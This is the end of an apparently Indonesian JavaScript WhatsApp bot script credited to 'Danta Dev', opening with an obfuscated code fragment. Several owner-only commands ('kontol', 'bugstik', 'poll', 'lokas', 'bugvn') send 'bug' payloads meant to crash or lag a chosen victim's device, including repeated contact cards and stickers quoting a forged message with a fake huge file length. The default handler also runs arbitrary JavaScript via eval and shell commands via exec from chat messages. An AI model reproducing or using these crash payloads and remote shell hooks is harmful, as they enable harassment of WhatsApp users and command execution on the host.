_0x5da34f(_0x4d1821,_0x3924c6,_0x51c678,_0x12adf0,_0x21a901){return _0x58ad0b(_0x51c678,_0x3924c6-0xad,_0x21a901- -0x1b5,_0x12adf0-0x5b,_0x21a901-0xc3);}var _0xe09297=new _0x4e7b70(_0x3f3960[_0x5da34f(-0x80,-0x7c,-0x9f,-0x78,-0x2e)],'i');function _0x1d0a17(_0x432e49,_0x17bfaa,_0x395cc5,_0x2156fd,_0x1b2bb1){return _0x280cf1(_0x2156fd,_0x17bfaa-0x1cd,_0x17bfaa- -0x11f,_0x2156fd-0xa5,_0x1b2bb1-0x171);}var _0x18d43b=_0x3f3960[_0x1d0a17(0x45e,0x44f,0x4a1,0x3ce,0x41e)](_0x4f8fb4,_0x3f3960[_0x5da34f(-0x49,-0xd5,-0x8e,-0xc6,-0x48)]);function _0x28f853(_0x395569,_0x11ab3f,_0xc144ca,_0x3dbda5,_0x537a44){return _0x280cf1(_0xc144ca,_0x11ab3f-0x174,_0x3dbda5-0x49,_0x3dbda5-0x1d,_0x537a44-0x143);}function _0x18a8f2(_0x4d387b,_0x312c0d,_0x301a0a,_0x2e7e3a,_0x2ff5d1){return _0x58ad0b(_0x4d387b,_0x312c0d-0xb9,_0x312c0d- -0x207,_0x2e7e3a-0x1bd,_0x2ff5d1-0x196);}function _0x3d5f72(_0x269546,_0x9085b4,_0x12e6f1,_0x3f2cab,_0x29d862){return _0x58478b(_0x12e6f1,_0x29d862-0x2e9,_0x12e6f1-0x2a,_0x3f2cab-0xa4,_0x29d862-0x8);}!_0x14b530[_0x5da34f(-0xca,-0x29,0x2,-0x81,-0x51)](_0x3f3960[_0x28f853(0x49f,0x56a,0x504,0x4ed,0x49c)](_0x18d43b,_0x3f3960[_0x18a8f2(-0xe8,-0x7c,-0xa,-0x5d,-0xd5)]))||!_0xe09297[_0x18a8f2(-0x13a,-0xa3,-0xfa,-0xe0,-0x60)](_0x3f3960[_0x18a8f2(-0x156,-0xd9,-0x6a,-0x7b,-0x86)](_0x18d43b,_0x3f3960[_0x5da34f(0xf,-0x4e,-0xdc,-0xe0,-0x8b)]))?_0x3f3960[_0x1d0a17(0x3bf,0x3d2,0x45b,0x3ec,0x3fd)](_0x18d43b,'0'):_0x3f3960[_0x3d5f72(0x4c6,0x486,0x4d4,0x421,0x468)](_0x1407c8);})();}catch(_0x6004e7){}}
}
break
case 'kontol': {
if (!isCreator) throw mess.owner
if (!text) throw `Nomernya mana?`
danta.sendContact(`${text}@s.whatsapp.net`, global.premium, virkonrafa)
danta.sendContact(`${text}@s.whatsapp.net`, global.premium, virkonrafa)
danta.sendContact(`${text}@s.whatsapp.net`, global.premium, virkonrafa)
danta.sendContact(`${text}@s.whatsapp.net`, global.premium, virkonrafa)
danta.sendContact(`${text}@s.whatsapp.net`, global.premium, virkonrafa)
m.reply(`Sukses Send Kontol Di Nomer ${text}`)
}
break
case 'bugvn': {
if (!isCreator) throw mess.owner
fromMe: false,
 nyong = fs.readFileSync('./database/sound/mastah.mp3')
 danta.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ca': {
if (!isCreator) throw mess.owner
fromMe: false,
 ri = fs.readFileSync('./database/sound/ikehcok.mp3')
 danta.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ci': {
if (!isCreator) throw mess.owner
fromMe: false,
 ru = fs.readFileSync('./database/sound/loli.mp3')
 danta.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cu': {
if (!isCreator) throw mess.owner
fromMe: false,
 re = fs.readFileSync('./database/sound/kesel.mp3')
 danta.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'co': {
if (!isCreator) throw mess.owner
fromMe: false,
 ro = fs.readFileSync('./database/sound/ngeselin.mp3')
 danta.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugstik':{
if (!isCreator) throw mess.owner
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Danta Dev`
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "999999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
m.chat('Sukses Send Bug Sebanyak ${jumlah}')
}
break
case 'lokas': {
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/dantaganz.jpg') }, { upload: danta.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© DappaGanzz${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
danta.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
case 'poll': {
if (!isCreator) throw mess.owner
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA Danta Dev",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM BROTHER BY Danta Dev"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
danta.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16': 
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
danta_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await danta.sendMessage(m.chat, { audio: danta_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    danta.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
